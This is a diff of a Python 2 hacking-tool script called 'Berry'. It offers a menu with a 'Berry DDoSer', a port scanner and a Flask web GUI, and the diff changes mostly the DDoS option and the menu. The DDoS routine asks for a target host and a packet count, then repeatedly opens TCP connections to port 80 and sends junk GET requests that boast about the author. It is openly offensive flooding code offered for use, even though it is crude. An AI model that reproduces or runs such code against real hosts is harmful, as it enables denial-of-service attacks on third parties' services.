@@ -7,32 +7,19 @@
 #+------------------------------------------------+
 """
 """
-import time, socket, os, sys, string, random, subprocess
-import httplib, socket
+
+__name = 'Abrupt'
+__author = '@strrrry'
+__email = 'zeekthegeek291@gamil.com'
+__website = 'http://abrupt.github.io/'
+
+
+import time, os, sys, string, random, subprocess, socket
+import httplib
 from flask import Flask
+from termcolor import colored, cprint
 from colorama import *
 init()
-
-#author's info
-class author(object):		
-	def __init__(self):
-		self.__name = 'Abrupt'
-		self.__author = '@strrrry'
-		self.__email = 'zeekthegeek291@gamil.com'
-		self.__website = 'http://abrupt.github.io/'
-
-# generates a user agent array
-def user_agent():
-	global uagent
-	uagent=[]
-	uagent.append("uagent Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
-	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
-	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
-	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
-	uagent.append("uagent=[]Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
-	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
-	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
-	return(uagent)
 
 #Extra Shizzzz / Not really important :/
 version = "0.0.1]"
@@ -58,11 +45,11 @@ def main():
 	print("\t    `.     ,'    ")
 	print("\t      `-.-'      ")
 	print("\t             [v" + version)
-		#Menu when loaded
         print "\nSelect option:"
         print
         print "\t [1] Berry DDoSer"
-        print "\t [2] Start Webgui (Currently Still in Beta)"
+        print "\t [2] Berry Port Scanner (Currently Still in Beta)"
+        print "\t [3] Berry Web"
 	print "\n0) To Exit"
         print
         print
@@ -71,37 +58,47 @@ def main():
         print
 
         if choice == '1':
-        	print ("[!] DDoS Mode Loading")
-        	time.sleep(3)
-        	#params for dos
-        	host = raw_input('Host: ')	
-        	host = host.replace("http://","")
-        	port = 80
-        	conn = raw_input("Number of Packets: ")
-        	print("<--Loading DDoS Attack-->")
-        	time.sleep(4)
-        	message = "#strrrry is an eGod"
-        	ip = socket.gethostbyname(host)
+        	try:
+        		print("NOTE - Enter IP or URL")
+	        	print ("\n[!] DDoS Mode Loading")
+	        	time.sleep(2)
+	        	#params for dos
+	        	host = raw_input('Enter Host: ')	
+	        	host = host.replace("http://","")
+	        	open_port = 80
+	        	conn = raw_input("Number of Packets: ")
+	        	cprint("<--Loading DDoS Attack-->", 'yellow', attrs=['bold'])
+	        	time.sleep(6)
+	        	message = "@strrrry is an eGod!!!"
+	        	ip = socket.gethostbyname(host)
+
+        	except KeyboardInterrupt:
+				raw_input("\n\n\t[!] Shutting Down...")
+				exit()
 
         	def ddos_run():
         		ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         		try:
         			#start ddos attack
-        			ddos.connect((host, port))
+        			ddos.connect((host, open_port))
         			ddos.send( "GET /%s HTTP/1.1\r\n" % message )
-			        ddos.sendto( "GET /%s HTTP/1.1\r\n" % message, (ip, port) )
+			        ddos.sendto( "GET /%s HTTP/1.1\r\n" % message, (ip, open_port) )
 			        ddos.send( "GET /%s HTTP/1.1\r\n" % message )
         		except socket.error, msg:
         			print("\n\t[!] [Connection Failed]")
         			exit()
-        		print("[" + time.ctime(time.time()) + "]" + " [Attack Serving on port: %s]" % port)
-        		print ("[%s]" % ip)
+        		cprint("[" + time.ctime(time.time()) + "]" + " [Attack Serving on port: %s]" % open_port, 'cyan', attrs=['bold'])
+        		cprint ("[%s]" % ip, 'yellow', attrs=['bold'])
         		ddos.close()
 
         	for i in xrange(int(conn)):
         		ddos_run()
 
         if choice == '2':
+
+        	port_scanner()
+						
+        if choice == '3':
         	#Run webgui
 			app = Flask(__name__)
 
@@ -112,7 +109,14 @@ def main():
 				<head>
 					<style>
 					 body{
-					 	background-color: black;
+					 	background-image: url('http://www.hdwallpapersos.com/wp-content/uploads/2014/08/337334.jpg');
+					 	background-size: cover;
+					}
+					h1 {
+						font-size: 45px
+					}
+					h2 {
+						font-size: 30px
 					}
 				</style>
 				</head>
